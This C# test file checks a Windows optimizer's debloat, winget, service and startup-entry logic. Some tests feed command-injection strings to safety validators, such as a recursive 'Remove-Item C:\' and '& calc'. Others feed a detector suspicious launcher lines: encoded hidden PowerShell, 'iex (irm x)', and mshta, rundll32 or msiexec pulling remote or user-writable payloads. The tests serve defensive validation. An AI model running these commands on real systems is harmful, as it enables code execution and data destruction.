using System.Diagnostics;
using Optimizer.Core.Actions;
using Optimizer.Core.Apps;
using Optimizer.Core.Catalog;
using Optimizer.Core.Cleanup;
using Optimizer.Core.Debloat;
using Optimizer.Core.Docs;
using Optimizer.Core.Findings;
using Optimizer.Core.Findings.Checks;
using Optimizer.Core.Hardware;
using Optimizer.Core.Services;
using Optimizer.Core.Startup;
using Optimizer.Core.Tools;
using Optimizer.Core.Tweaks;

namespace Optimizer.Core.Tests;

public class DebloatServicesAppsTests
{
    [Fact]
    public void AppxListParsesSingleObjectAndArrays()
    {
        Assert.Single(DebloatService.ParseList("""{"Name":"Microsoft.BingNews","PackageFamilyName":"Microsoft.BingNews_8wekyb3d8bbwe","Version":"4.1","NonRemovable":false}"""));
        var list = DebloatService.ParseList("""[{"Name":"A","PackageFamilyName":"A_1","Version":"1","NonRemovable":false},{"Name":"B","PackageFamilyName":"B_1","Version":"2","NonRemovable":true}]""");
        Assert.True(list[1].NonRemovable);
    }

    [Fact]
    public void DebloatOnlyOffersCatalogAppsAndHonorsGuards()
    {
        var installed = new[]
        {
            new InstalledAppx("Microsoft.BingNews", "Microsoft.BingNews_8wekyb3d8bbwe", "1", false),
            new InstalledAppx("Microsoft.WindowsStore", "Microsoft.WindowsStore_8wekyb3d8bbwe", "1", true),
            new InstalledAppx("Microsoft.XboxGamingOverlay", "Microsoft.XboxGamingOverlay_8wekyb3d8bbwe", "1", false),
            new InstalledAppx("Some.Random.App", "x", "1", false),
        };
        var x3d = new CpuInfo("AMD Ryzen 9 9950X3D 16-Core Processor", Vendor.Amd, 26, 68, 0, 16, 32, 4300, "AM5", null, null, "t",
            [new CacheDomain(3, 96L << 20, 0, 0), new CacheDomain(3, 32L << 20, 0, 1)], new Dictionary<int, int> { [0] = 16 });
        var offered = DebloatService.Offer(CatalogData.Current.Appx, installed, new HardwareProfile { Os = TestData.Os(), Cpu = x3d }, CatalogData.Current);
        Assert.Equal(["Microsoft.BingNews", "Microsoft.XboxGamingOverlay"], offered.Select(o => o.Entry.Name).Order());
        Assert.Equal("block.appX3dGameBar", offered.Single(o => o.Entry.Name == "Microsoft.XboxGamingOverlay").BlockKey);
        Assert.True(DebloatService.IsSafeName("Microsoft.BingNews"));
        Assert.False(DebloatService.IsSafeName("x'; Remove-Item C:\\ -Recurse; '"));
        Assert.All(CatalogData.Current.Appx.Apps, a => Assert.False(CatalogData.Current.Appx.IsProtected(a.Name), a.Name));
        // The exception frees only Game Assist: Edge and its other packages stay protected.
        Assert.False(CatalogData.Current.Appx.IsProtected("Microsoft.Edge.GameAssist"));
        Assert.True(CatalogData.Current.Appx.IsProtected("Microsoft.MicrosoftEdge.Stable"));
        Assert.True(CatalogData.Current.Appx.IsProtected("Microsoft.Edge.GameAssistant"));
        // An exception is always one exact package: "!Microsoft.Edge*" would unprotect all of Edge.
        Assert.All(CatalogData.Current.Appx.Protected.Where(p => p.StartsWith('!')), p => Assert.False(p.EndsWith('*'), p));
    }

    [Fact]
    public void SuffixEntriesMatchAnyPublisherPrefixButNothingElse()
    {
        var installed = new[]
        {
            new InstalledAppx("GAMELOFTSA.Asphalt8Airborne", "GAMELOFTSA.Asphalt8Airborne_x", "1", false),
            new InstalledAppx("Contoso.NotAsphalt8Airborne", "x", "1", false),
            new InstalledAppx("Asphalt8AirborneExtra", "x", "1", false),
            new InstalledAppx("king.com.CandyCrushSaga", "x", "1", false),
            new InstalledAppx("Other.king.com.CandyCrushSaga", "x", "1", false),
        };
        var offered = DebloatService.Offer(CatalogData.Current.Appx, installed, new HardwareProfile { Os = TestData.Os() }, CatalogData.Current);
        // A suffix entry matches after a dot; an exact entry (king.com.*) only matches its full name.
        Assert.Equal(["GAMELOFTSA.Asphalt8Airborne", "king.com.CandyCrushSaga"], offered.Select(o => o.Installed.Name).Order());
        Assert.All(CatalogData.Current.Appx.Apps, a => Assert.True(DebloatService.IsSafeName(a.Name), a.Name));
        Assert.Equal(CatalogData.Current.Appx.Apps.Count, CatalogData.Current.Appx.Apps.Select(a => a.Name.ToLowerInvariant()).Distinct().Count());
    }

    [Fact]
    public void RemovedAppsThatAreInstalledAgainAreReported()
    {
        var removed = new[]
        {
            new RemovedApp("Microsoft.BingNews", "f", "1", DateTimeOffset.Now),
            new RemovedApp("Microsoft.BingNews", "f", "2", DateTimeOffset.Now),
            new RemovedApp("Clipchamp.Clipchamp", "f", "1", DateTimeOffset.Now),
        };
        var installed = new[] { new InstalledAppx("microsoft.bingnews", "f", "3", false), new InstalledAppx("Other.App", "f", "1", false) };
        Assert.Equal(["Microsoft.BingNews"], DebloatService.CameBack(removed, installed).Select(r => r.Name));
        Assert.Empty(DebloatService.CameBack(removed, []));
    }

    [Fact]
    public void RemovedAppsKeepTheStoreLink()
    {
        // Records written before product IDs were known keep the (deprecated but working) package family name link.
        Assert.Equal("ms-windows-store://pdp/?PFN=Microsoft.BingNews_8wekyb3d8bbwe", new RemovedApp("Microsoft.BingNews", "Microsoft.BingNews_8wekyb3d8bbwe", "1", DateTimeOffset.Now).StoreLink);
        Assert.Equal("ms-windows-store://pdp/?ProductId=9WZDNCRFHVFW", new RemovedApp("Microsoft.BingNews", "Microsoft.BingNews_8wekyb3d8bbwe", "1", DateTimeOffset.Now, "9WZDNCRFHVFW").StoreLink);
        // Apps the Store no longer offers get no reinstall link.
        Assert.Null(new RemovedApp("Microsoft.WindowsMaps", "Microsoft.WindowsMaps_8wekyb3d8bbwe", "1", DateTimeOffset.Now, null, Reinstallable: false).StoreLink);
    }

    [Fact]
    public void EveryDebloatEntrySaysWhetherTheStoreStillOffersIt() =>
        Assert.All(CatalogData.Current.Appx.Apps, a => Assert.Contains(a.Reinstall, new[] { "store", "none" }));

    [Fact]
    public void WingetScopeIsPassedOnlyWhenItIsAKnownValue()
    {
        Assert.Contains(" --scope machine ", Winget.InstallArguments("Microsoft.PowerToys", "machine"));
        Assert.DoesNotContain("--scope", Winget.InstallArguments("Microsoft.PowerToys", null));
        Assert.DoesNotContain("--scope", Winget.InstallArguments("Microsoft.PowerToys", "machine; calc"));
        Assert.Equal("machine", CatalogData.Current.Apps.Apps.Single(a => a.Id == "Microsoft.PowerToys").WingetScope);
    }

    [Fact]
    public void InstallerTypeIsPassedOnlyWhenItIsAKnownValue()
    {
        Assert.Contains(" --installer-type exe ", Winget.InstallArguments("Microsoft.DirectX", null, "exe"));
        Assert.DoesNotContain("--installer-type", Winget.InstallArguments("Microsoft.DirectX", null, null));
        Assert.DoesNotContain("--installer-type", Winget.InstallArguments("Microsoft.DirectX", null, "exe; calc"));
        Assert.Equal("exe", CatalogData.Current.Apps.Apps.Single(a => a.Id == "Microsoft.DirectX").InstallerType);
    }

    /// <summary>
    /// Every app of the Install page has a unique, safe winget id, a scope the runner knows, a winget scope and installer
    /// type winget accepts (or none), a detection pattern that compiles, texts in both languages and a group heading;
    /// entries of one group stand together, so each heading appears once.
    /// </summary>
    [Fact]
    public void AppCatalogEntriesAreComplete()
    {
        var apps = CatalogData.Current.Apps.Apps;
        Assert.Equal(apps.Count, apps.Select(a => a.Id).Distinct(StringComparer.OrdinalIgnoreCase).Count());
        foreach (var a in apps)
        {
            Assert.True(Winget.IsSafeId(a.Id), a.Id);
            Assert.Contains(a.Scope, new[] { "machine", "user" });
            Assert.True(a.WingetScope is null or "machine" or "user", a.Id);
            Assert.True(a.InstallerType is null or "exe" or "msi" or "msix" or "inno" or "nullsoft" or "wix" or "burn", a.Id);
            if (a.Detect.Length > 0) _ = new System.Text.RegularExpressions.Regex(a.Detect);
            Assert.False(string.IsNullOrWhiteSpace(a.En) || string.IsNullOrWhiteSpace(a.De), a.Id);
            foreach (var lang in new[] { "en", "de" })
                Assert.NotEqual($"appCategory.{a.Category}", Labels.Current.Get(lang, $"appCategory.{a.Category}"));
        }
        var groups = apps.Select(a => a.Category).Aggregate(new List<string>(), (l, c) => { if (l.Count == 0 || l[^1] != c) l.Add(c); return l; });
        Assert.Equal(groups.Count, groups.Distinct().Count());
    }

    [Fact]
    public void ServiceEditRules()
    {
        var c = CatalogData.Current.Services;
        ServiceRow Row(string name, string? file, SignatureInfo? sig = null) =>
            new(name, name, null, ServiceStart.Automatic, true, file, file, c.Find(ServiceManager.BaseName(name))) { Signature = sig };
        var microsoft = new SignatureInfo(SignatureStatus.Signed, "Microsoft Windows", true);
        var vendor = new SignatureInfo(SignatureStatus.Signed, "Logitech Inc", false);

        Assert.Equal(ServiceEdit.ReadOnly, Row("RpcSs", @"C:\Windows\system32\rpcss.dll", microsoft).Edit);
        Assert.Equal(ServiceEdit.ReadOnly, Row("vgc", @"C:\Program Files\Riot Vanguard\vgc.exe", vendor).Edit);
        Assert.Equal(ServiceEdit.ManualOnly, Row("MapsBroker", @"C:\Windows\System32\moshost.dll", microsoft).Edit);
        Assert.Equal(ServiceEdit.ReadOnly, Row("SomeUnknownWindowsSvc", @"C:\Windows\System32\x.dll", microsoft).Edit);
        Assert.Equal(ServiceEdit.Full, Row("LGHUBUpdaterService", @"C:\Program Files\LGHUB\updater.exe", vendor).Edit);
        // Without a valid signature the Windows folder protects, except its folders standard users can write to.
        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var unsigned = new SignatureInfo(SignatureStatus.Unsigned, null, false);
        Assert.Equal(ServiceEdit.ReadOnly, Row("SomeSvc", Path.Combine(windows, @"System32\x.exe"), unsigned).Edit);
        Assert.Equal(ServiceEdit.Full, Row("SomeSvc", Path.Combine(windows, @"Temp\x.exe"), unsigned).Edit);
        Assert.Equal(ServiceEdit.Full, Row("SomeSvc", Path.Combine(windows, @"System32\Tasks\x.exe"), unsigned).Edit);
        Assert.Null(ServiceManager.Change(Row("MapsBroker", null, microsoft), ServiceStart.Disabled));
        Assert.NotNull(ServiceManager.Change(Row("MapsBroker", null, microsoft), ServiceStart.Manual));
        Assert.Equal("CDPUserSvc", ServiceManager.BaseName("CDPUserSvc_1a2b3c"));
        Assert.Equal("Spooler", ServiceManager.BaseName("Spooler"));
    }

    [Fact]
    public async Task ChangingAServiceSeveralTimesKeepsOneBackupAndNoFalseDrift()
    {
        using var fx = new EngineFixture();
        fx.Services.Start["LGHUBUpdaterService"] = ServiceStart.Automatic;
        var vendor = new SignatureInfo(SignatureStatus.Signed, "Logitech Inc", false);
        ServiceRow Row(ServiceStart s) => new("LGHUBUpdaterService", "LG HUB Updater", null, s, true, @"C:\Program Files\LGHUB\updater.exe", null,
            CatalogData.Current.Services.Find("LGHUBUpdaterService")) { Signature = vendor };
        var facts = new Facts().Set("os.build", 26300).Set("elevated", true);
        var options = new ApplyOptions { ContinueWithoutRestorePoint = true, ExpertMode = true };

        await fx.Engine.ApplyAsync(ServiceManager.Change(Row(ServiceStart.Automatic), ServiceStart.Manual)!, facts, options);
        await fx.Engine.ApplyAsync(ServiceManager.Change(Row(ServiceStart.Manual), ServiceStart.Disabled)!, facts, options);
        Assert.Equal(ServiceStart.Disabled, fx.Services.Start["LGHUBUpdaterService"]);

        var id = ServiceManager.ChangeId("LGHUBUpdaterService");
        Assert.Single(fx.Store.All(), b => b.TweakId.StartsWith("service.", StringComparison.Ordinal));
        Assert.Equal("Automatic", fx.Store.Get(id)!.Entries.Single().Original.Data);
        Assert.Empty(fx.Engine.CheckDrift(facts)); // the earlier choice (Manual) is not "reset by Windows"

        // Undo goes back to the true original.
        Assert.True(fx.Engine.Revert(fx.Engine.Resolve(id)!).Success);
        Assert.Equal(ServiceStart.Automatic, fx.Services.Start["LGHUBUpdaterService"]);
    }

    [Theory]
    [InlineData(@"powershell.exe -w hidden -enc SQBFAFgA", true)]
    [InlineData(@"powershell.exe -ExecutionPolicy Bypass -c ""iex (irm x)""", true)]
    [InlineData(@"powershell.exe -enc SQBFAFgA C:\Windows\System32\x.ps1", true)]
    [InlineData(@"powershell.exe -ExecutionPolicy Bypass -File C:\Windows\System32\x.ps1", false)]
    [InlineData(@"""C:\Windows\system32\cmd.exe"" /d /c C:\Windows\system32\hpatchmonTask.cmd", false)]
    [InlineData(@"cmd.exe /c C:\Users\x\AppData\Roaming\evil.bat", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\a.cmd & calc.exe", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\..\Temp\x.cmd", true)]
    // Folders below System32 that standard users can write to do not count as Windows' own files.
    [InlineData(@"cmd.exe /c C:\Windows\System32\spool\drivers\color\x.cmd", true)]
    [InlineData(@"wscript.exe C:\Windows\System32\Tasks\x.vbs", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\x.cmd", false)]
    [InlineData(@"mshta.exe https://example.invalid/x.hta", true)]
    [InlineData(@"wscript.exe ""C:\Users\x\AppData\Roaming\x.vbs""", true)]
    [InlineData(@"C:\Program Files\App\app.exe --minimized", false)]
    // A script host started by another one, and rundll32 entry points that start something else.
    [InlineData(@"cmd.exe /c C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc SQBFAFgA", true)]
    [InlineData(@"rundll32.exe C:\Windows\System32\shell32.dll,ShellExec_RunDLL C:\Users\Public\x.exe", true)]
    [InlineData(@"rundll32.exe url.dll,FileProtocolHandler https://example.invalid/x", true)]
    [InlineData(@"rundll32.exe C:\Windows\System32\x.dll,Entry C:\Users\Public\payload.bin", true)]
    [InlineData(@"""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask", false)]
    // The host without ".exe", and an alternate data stream on a folder users can write to.
    [InlineData(@"powershell -w hidden -enc SQBFAFgA", true)]
    // PowerShell without -File runs its arguments as a command: code after a System32 path still runs. A line break
    // starts another command in any host.
    [InlineData(@"powershell.exe -w hidden C:\Windows\System32\whoami.exe $(iex $env:P)", true)]
    [InlineData(@"powershell.exe -w hidden C:\Windows\System32\whoami.exe (iwr x)", true)]
    [InlineData("powershell.exe C:\\Windows\\System32\\whoami.exe\nStart-Process x", true)]
    [InlineData("cmd.exe /c C:\\Windows\\System32\\a.cmd\r\ncalc.exe", true)]
    [InlineData(@"powershell.exe -NoProfile -File C:\Windows\System32\WindowsPowerShell\v1.0\x.ps1 -Name $x", false)]
    [InlineData(@"wscript.exe C:\Windows\System32\Tasks:x.vbs", true)]
    // Signed launchers: flagged only when they start a file outside System32 or a URL.
    [InlineData(@"C:\Windows\explorer.exe C:\Users\Public\x.exe", true)]
    [InlineData(@"explorer.exe", false)]
    [InlineData(@"explorer.exe shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}", false)]
    [InlineData(@"pcalua.exe -a C:\Users\Public\x.exe", true)]
    [InlineData(@"msiexec.exe /i https://example.invalid/x.msi /qn", true)]
    [InlineData(@"msiexec.exe /x {11111111-2222-3333-4444-555555555555}", false)]
    [InlineData(@"control.exe C:\Windows\System32\desk.cpl", false)]
    // Paths with forward slashes, doubled separators, "." and short names are read as Windows reads them.
    [InlineData(@"wscript.exe C:/Users/Public/x.vbs C:\Windows\System32\kernel32.dll", true)]
    [InlineData(@"pcalua.exe -a C:/Users/Public/x.exe", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\\Tasks\x.cmd", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\.\Tasks\x.cmd", true)]
    [InlineData(@"cmd.exe /c C:\Windows\System32\spool\PRINTE~1\x.cmd", true)]
    [InlineData(@"cmd.exe /c C:/Windows/System32/WindowsPowerShell/v1.0/x.cmd", false)]
    // A launcher started by a script host, and rundll32 entry points that load a control panel or an INF.
    [InlineData(@"cmd.exe /c C:\Windows\System32\msiexec.exe /i C:\Users\Public\x.msi", true)]
    [InlineData(@"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL C:\Users\Public\x.cpl", true)]
    [InlineData(@"rundll32.exe C:\Windows\System32\advpack.dll,LaunchINFSection C:\Users\Public\x.inf,DefaultInstall", true)]
    public void ScriptHostEntriesAreFlaggedUnlessTheyOnlyRunSystemFiles(string command, bool flagged)
    {
        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var c = command.Replace(@"C:\Windows", windows, StringComparison.OrdinalIgnoreCase);
        Assert.Equal(flagged, CommandLine.RunsUnverifiedScript(c));
    }

    [Fact]
    public void ProgramKeepsRundllAsTheProgramWithItsArguments()
    {
        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var (file, args) = CommandLine.Program($@"RunDll32 {windows}\system32\x.dll,LaunchSetup ""C:\Program Files\App\setup.exe"" -removeonly")!.Value;
        Assert.Equal(Path.Combine(windows, @"System32\RunDll32"), file.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ? file[..^4] : file, ignoreCase: true);
        Assert.Equal($@"{windows}\system32\x.dll,LaunchSetup ""C:\Program Files\App\setup.exe"" -removeonly", args);
    }

    [Fact]
    public void RundllTasksResolveToTheirDll()
    {
        var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        var image = CommandLine.ImagePath($@"""{windows}\system32\rundll32.exe"" %windir%\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask");
        Assert.Equal(Path.Combine(windows, @"system32\AppxDeploymentClient.dll"), image, ignoreCase: true);
        Assert.False(CommandLine.IsScriptHost(image));
    }

    [Fact]
    public void RuntimeIdsDoNotCollide()
    {
        // Non-ASCII names and long names that only differ at the end got the same id before.
        StartupEntry Run(string name) => new(StartupKind.RunKey, name, "x.exe", null, "HKCU Run", Hive.User, true, $@"run:user:Run\{name}") { Target = @"Software\Microsoft\Windows\CurrentVersion\Run" };
        var a = StartupTweaks.Set(Run("微信"), false)!.Id;
        var b = StartupTweaks.Set(Run("钉钉"), false)!.Id;
        Assert.NotEqual(a, b);
        var longA = StartupTweaks.Set(Run(new string('a', 60) + "1"), false)!.Id;
        var longB = StartupTweaks.Set(Run(new string('a', 60) + "2"), false)!.Id;
        Assert.NotEqual(longA, longB);
        Assert.Equal(TweakIds.Slug("Spooler"), TweakIds.Slug("SPOOLER")); // service and registry names are case-insensitive
        Assert.NotEqual(ServiceManager.ChangeId("Svc"), ServiceManager.ChangeId("Svc_1"));
        Assert.NotEqual(TweakIds.Slug(@"PCI\VEN_10DE&DEV_1F02&SUBSYS_00000000&REV_A1\4&1&0&0008"), TweakIds.Slug(@"PCI\VEN_10DE&DEV_1F02&SUBSYS_00000000&REV_A1\4&1&0&0009"));
    }

    [Fact]
    public void ElevatedWingetComesOnlyFromTheProtectedPackageFolder()
    {
        Assert.Equal(new Version(1, 29, 380, 0), Winget.PackageVersion("Microsoft.DesktopAppInstaller_1.29.380.0_x64__8wekyb3d8bbwe"));
        Assert.Null(Winget.PackageVersion("Microsoft.DesktopAppInstaller_1.29.380.0_neutral_split.language-de_8wekyb3d8bbwe"));
        // A folder outside Program Files\WindowsApps (for example in the user's profile) is never used.
        var userFolder = Path.Combine(Path.GetTempPath(), "Microsoft.DesktopAppInstaller_9.0.0.0_x64__8wekyb3d8bbwe");
        Directory.CreateDirectory(userFolder);
        System.IO.File.WriteAllText(Path.Combine(userFolder, "winget.exe"), "");
        try
        {
            Assert.Null(Winget.FindTrusted([("Microsoft.DesktopAppInstaller_9.0.0.0_x64__8wekyb3d8bbwe", userFolder)]));
        }
        finally
        {
            TestFolders.Delete(userFolder);
        }
    }

    /// <summary>Reads this PC (read-only): if App Installer is registered, the result is its package folder, never the alias.</summary>
    [Fact]
    [Trait("Category", "Hardware")]
    public void WingetOnThisPcIsTheProtectedPackage()
    {
        var apps = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "WindowsApps");
        if (Winget.FindTrusted() is { } found)
        {
            Assert.StartsWith(apps + "\\", found, StringComparison.OrdinalIgnoreCase);
            Assert.DoesNotContain(@"\AppData\", found, StringComparison.OrdinalIgnoreCase);
        }
    }

    [Fact]
    public void WingetSafetyAndCatalog()
    {
        Assert.All(CatalogData.Current.Apps.Apps, a => Assert.True(Winget.IsSafeId(a.Id), a.Id));
        Assert.False(Winget.IsSafeId("Valve.Steam & calc"));
        Assert.True(Winget.IsSuccess(0));
        Assert.True(Winget.IsSuccess(unchecked((int)0x8A15002B)));
        Assert.False(Winget.IsSuccess(1));
        var steam = CatalogData.Current.Apps.Apps.Single(a => a.Id == "Valve.Steam");
        Assert.True(steam.IsInstalled([new Hardware.Probes.InstalledProgram("Steam", "2.10", "Valve", false)]));
        Assert.False(steam.IsInstalled([new Hardware.Probes.InstalledProgram("Steam Link", "1", "Valve", false)]));
        // SignalRGB (also in the list) is not the Signal messenger.
        var signal = CatalogData.Current.Apps.Apps.Single(a => a.Id == "OpenWhisperSystems.Signal");
        Assert.True(signal.IsInstalled([new Hardware.Probes.InstalledProgram("Signal 7.40.0", "7.40.0", "Signal Messenger, LLC", true)]));
        Assert.False(signal.IsInstalled([new Hardware.Probes.InstalledProgram("SignalRGB", "2.4", "WhirlwindFX", false)]));
        Assert.Equal(new DateTime(2024, 5, 17), DriverInventory.ParseCimDate("20240517000000.******+000"));
    }

    [Fact]
    public void PlaceholderDriverDatesHaveNoAge()
    {
        var today = new DateTime(2026, 10, 12);
        DriverRow Row(DateTime date) => new("Intel(R) SMBus", "SYSTEM", "INTEL", "INTEL", "10.1.16.7", date, "oem12.inf", @"PCI\VEN_8086");
        // Intel chipset INF and Windows inbox placeholders: no age, so the page does not call them decades old.
        Assert.Null(Row(new DateTime(1968, 7, 18)).AgeDays(today));
        Assert.Null(Row(new DateTime(2006, 6, 21)).AgeDays(today));
        Assert.Equal(2985, Row(new DateTime(2018, 8, 10)).AgeDays(today));
    }

    [Fact]
    public async Task OptionalFeatureStateFromEnglishDismOutput()
    {
        using var fx = new EngineFixture();
        var state = "Disabled";
        fx.Processes.Handler = (file, args) =>
        {
            if (!file.Equals("dism.exe", StringComparison.OrdinalIgnoreCase)) return null;
            if (args.Contains("/Get-FeatureInfo")) return args.Contains("Missing") ? (87, "Error: 0x800f080c") : (0, $"Feature Name : SMB1Protocol\r\nState : {state}\r\n");
            if (args.Contains("/Enable-Feature")) { state = "Enable Pending"; return (3010, "restart required"); }
            if (args.Contains("/Disable-Feature")) { state = "Disabled"; return (0, ""); }
            return null;
        };
        var smb = new FeatureEntry { Name = "SMB1Protocol", Title = "SMB 1.0" };
        var t = OptionalFeatureAction.Tweak(smb, enabled: true);
        Assert.Equal(TweakState.NotApplied, fx.Engine.DetectState(t, new Facts().Set("os.build", 26300)));
        var r = await fx.Engine.ApplyAsync(t, new Facts().Set("os.build", 26300).Set("elevated", true), new ApplyOptions { ContinueWithoutRestorePoint = true });
        Assert.Equal(ApplyOutcome.Applied, r.Outcome);
        Assert.Equal("Enabled", OptionalFeatureAction.ReadState(fx.Processes, "SMB1Protocol")); // pending counts as the target state
        Assert.Null(OptionalFeatureAction.ReadState(fx.Processes, "Missing"));
        Assert.True(fx.Engine.Revert(t).Success);
        Assert.Equal("Disabled", state);
    }

    /// <summary>Undo of "feature off" turns it on without /All (parents the user turned off stay off), /All only when DISM needs it.</summary>
    [Theory]
    [InlineData(false, 1)]
    [InlineData(true, 2)]
    public async Task UndoOfFeatureOffTurnsOnlyThatFeatureOn(bool parentOff, int enableCalls)
    {
        using var fx = new EngineFixture();
        var state = "Enabled";
        var enables = new List<string>();
        fx.Processes.Handler = (file, args) =>
        {
            if (!file.Equals("dism.exe", StringComparison.OrdinalIgnoreCase)) return null;
            if (args.Contains("/Get-FeatureInfo")) return (0, $"Feature Name : Printing-XPSServices-Features\r\nState : {state}\r\n");
            if (args.Contains("/Enable-Feature"))
            {
                enables.Add(args);
                if (parentOff && !args.Contains("/All")) return (50, "Error: 50 A parent feature is not enabled");
                state = "Enabled";
                return (0, "");
            }
            if (args.Contains("/Disable-Feature")) { state = "Disabled"; return (0, ""); }
            return null;
        };
        var t = OptionalFeatureAction.Tweak(new FeatureEntry { Name = "Printing-XPSServices-Features", Title = "XPS" }, enabled: false);
        var facts = new Facts().Set("os.build", 26300).Set("elevated", true);
        Assert.Equal(ApplyOutcome.Applied, (await fx.Engine.ApplyAsync(t, facts, new ApplyOptions { ContinueWithoutRestorePoint = true })).Outcome);
        Assert.True(fx.Engine.Revert(t).Success);
        Assert.Equal("Enabled", state);
        Assert.Equal(enableCalls, enables.Count);
        Assert.DoesNotContain("/All", enables[0]);
    }

    /// <summary>
    /// Feature switch ids come from TweakIds.Slug now. A switch an earlier version made keeps its old id (the lowercase
    /// feature name): the Features page still finds that backup, so switching back undoes it instead of making a second
    /// change, and after the restart of the app the stored definition still undoes it.
    /// </summary>
    [Fact]
    public async Task FeatureSwitchesOfEarlierVersionsAreStillFoundByTheirOldId()
    {
        using var fx = new EngineFixture();
        var state = "Enabled";
        fx.Processes.Handler = (file, args) =>
        {
            if (!file.Equals("dism.exe", StringComparison.OrdinalIgnoreCase)) return null;
            if (args.Contains("/Get-FeatureInfo")) return (0, $"Feature Name : SMB1Protocol\r\nState : {state}\r\n");
            if (args.Contains("/Enable-Feature")) { state = "Enabled"; return (0, ""); }
            if (args.Contains("/Disable-Feature")) { state = "Disabled"; return (0, ""); }
            return null;
        };
        var smb = new FeatureEntry { Name = "SMB1Protocol", Title = "SMB 1.0" };
        var legacy = OptionalFeatureAction.LegacyTweakId(smb.Name, enabled: false);
        Assert.Equal("feature.off.smb1protocol", legacy);
        var current = OptionalFeatureAction.TweakId(smb.Name, enabled: false);
        Assert.Equal("feature.off." + TweakIds.Slug("SMB1Protocol"), current);
        Assert.Equal(current, OptionalFeatureAction.TweakId("smb1protocol", enabled: false)); // DISM names are case-insensitive
        Assert.Equal(current, OptionalFeatureAction.Tweak(smb, enabled: false, fx.Store.Exists).Id);
        Assert.Equal(current, OptionalFeatureAction.Tweak(smb, enabled: false).Id);

        // What an earlier version applied: a backup under the old id.
        var facts = new Facts().Set("os.build", 26300).Set("elevated", true);
        var old = OptionalFeatureAction.Tweak(smb, enabled: false, id => id == legacy);
        Assert.Equal(legacy, old.Id);
        Assert.Equal(ApplyOutcome.Applied, (await fx.Engine.ApplyAsync(old, facts, new ApplyOptions { ContinueWithoutRestorePoint = true })).Outcome);
        Assert.Equal("Disabled", state);

        // The Features page builds the switch with the store's check: the old id, so the existing change is the one undone.
        var built = OptionalFeatureAction.Tweak(smb, enabled: false, fx.Store.Exists);
        Assert.Equal(legacy, built.Id);
        Assert.True(fx.Store.Exists(built.Id));
        Assert.Equal(TweakState.PendingRestart, fx.Engine.DetectState(built, facts)); // read from the old backup
        // The other direction has no backup of either kind: the new id.
        Assert.Equal(OptionalFeatureAction.TweakId(smb.Name, enabled: true), OptionalFeatureAction.Tweak(smb, enabled: true, fx.Store.Exists).Id);

        // The app after a restart: the stored definition under the old id still undoes it.
        var engine = new TweakEngine(fx.Context, new Backup.BackupStore(fx.BackupRoot, secure: false), fx.RestorePoints, "test", 26300);
        Assert.Equal(legacy, engine.Resolve(legacy)?.Id);
        Assert.True(fx.Engine.Revert(built).Success);
        Assert.Equal("Enabled", state);
        Assert.False(fx.Store.Exists(legacy));
        Assert.Equal(current, OptionalFeatureAction.Tweak(smb, enabled: false, fx.Store.Exists).Id);

        // When both ids have a backup, the current one wins.
        Assert.Equal("new", TweakIds.OrLegacy("new", "old", _ => true));
        Assert.Equal("new", TweakIds.OrLegacy("new", "old", null));
    }

    /// <summary>
    /// The uninstall guard looks at every OneDrive account: Documents moved into the work account (Business1) blocks
    /// it, even when the personal account is listed first. A scan that stops at its limit blocks too.
    /// </summary>
    [Fact]
    public void OneDriveGuardChecksEveryAccountAndAnIncompleteScan()
    {
        using var r = new SandboxRegistry();
        var root = TestFolders.Create("onedrive");
        try
        {
            var personal = Path.Combine(root, "OneDrive");
            var work = Path.Combine(root, "OneDrive - Contoso");
            Directory.CreateDirectory(personal);
            Directory.CreateDirectory(Path.Combine(work, "Documents"));
            for (var i = 0; i < 5; i++) File.WriteAllText(Path.Combine(work, $"f{i}.txt"), "x");
            const string accounts = @"Software\Microsoft\OneDrive\Accounts";
            const string shell = @"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders";
            RegistryValue.Write(r, Hive.User, accounts + @"\Personal", "UserFolder", "string", personal);
            RegistryValue.Write(r, Hive.User, accounts + @"\Business1", "UserFolder", "string", work);
            RegistryValue.Write(r, Hive.User, shell, "Personal", "string", Path.Combine(work, "Documents"));

            Assert.Equal(["Personal"], OneDrive.Read(r, root).RedirectedFolders);

            RegistryValue.Write(r, Hive.User, shell, "Personal", "string", Path.Combine(root, "Documents"));
            var cut = OneDrive.Read(r, root, maxFiles: 3);
            Assert.True(cut.ScanTruncated);
            Assert.Equal("block.oneDriveScanIncomplete", (cut with { SetupPath = "x" }).BlockKey);
        }
        finally
        {
            TestFolders.Delete(root);
        }
    }
}
